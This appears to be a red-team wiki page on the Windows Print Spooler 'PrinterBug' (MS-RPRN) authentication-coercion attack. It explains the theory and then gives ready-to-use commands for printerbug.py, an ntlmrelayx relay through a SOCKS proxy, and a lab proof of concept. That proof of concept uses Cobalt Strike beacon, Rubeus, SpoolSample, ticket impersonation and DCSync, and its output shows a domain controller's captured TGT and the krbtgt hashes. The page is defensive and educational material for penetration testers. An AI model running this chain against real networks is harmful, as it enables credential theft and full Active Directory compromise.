# MS-RPRN abuse (PrinterBug)

## Theory

At DerbyCon 2018 Will Schroeder, Lee Christensen and Matt Nelson gave a presentation called "The Unintended Risks of Trusting Active Directory". Within that talk, they demonstrated how an adversary can coerce any machine in a forest to authenticate to another machine in the forest, via a means they dubbed "the printer bug".

The MS-RPRN Print System Remote Protocol (hence the cute name) defines the communications for print job processing and print system management between a print client and a print server. Lee used **RpcRemoteFindFirstPrinterChangeNotificationEx()**, to set up a change notification between a print server (_Machine A_) and a print client (_Machine B_). This caused _Machine A_ to authenticate to _Machine B_.

If _Machine B_ is configured with unconstrained delegation, this would allow us to capture the TGT of _Machine A_. With a TGT for _Machine A_, we can craft service tickets to access any service on _Machine A_ as a local administrator. And of course if _Machine A_ is a domain controller, we will gain Domain Admin level privilege.

Furthermore, this RPC service is accessible by all domain users, is enabled by default since Windows 8 and won't be fixed by Microsoft since it's "by design".

Microsoft’s Print Spooler is a service handling the print jobs and other various tasks related to printing. An attacker controling a domain user/computer can, with a specific RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and enabled by default on all Windows environments ([more info on the finding](https://fr.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/47)).

**The coerced authentications are made over SMB**. But MS-RPRN abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP which heightens [NTLM relay](../ntlm/relay.md) capabilities.

The "specific call" mentioned above is the `RpcRemoteFindFirstPrinterChangeNotificationEx` notification method, which is part of the MS-RPRN protocol. MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.

{% hint style="info" %}
The attacker needs a foothold on the domain (i.e. compromised account) for this attack to work since the coercion is operated through an RPC call in the SMB `\pipe\spoolss` named pipe through the `IPC$` share.
{% endhint %}

## Practice

Remotely checking if the spooler is available can be done with [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) (Powershell) or with [rpcdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) (Python).

The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) or [SpoolSample](https://github.com/leechristensen/SpoolSample) (C#). There are many alternatives available publicly on the Internet.

{% tabs %}
{% tab title="printerbug" %}
Trigger the spooler service

```bash
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
```
{% endtab %}

{% tab title="rpcdump" %}
Check if the spooler service is available

```bash
rpcdump.py $TARGET | grep -A 6 "spoolsv"
```
{% endtab %}

{% tab title="SpoolerScanner" %}
Check if the spooler service is available

```
```
{% endtab %}

{% tab title="ntlmrelayx" %}
In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy.

```bash
ntlmrelayx.py -t smb://$TARGET -socks
proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
{% endhint %}



### POC

On SRV-1:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Target user     : DC-2$
[*] Monitoring every 10 seconds for new TGTs
```

On WKSTN-1:

```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

Where:

* `dc-2` is the "target" server
* `srv-1` is the "capture" server

```
[*] 3/9/2021 12:00:07 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 10:27:15 AM
  EndTime               :  3/9/2021 8:27:13 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFLz [...snip...] MuSU8=

[*] Ticket cache size: 1
```

```
beacon> make_token DEV\DC-2$ FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```

## Resources

{% embed url="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" %}
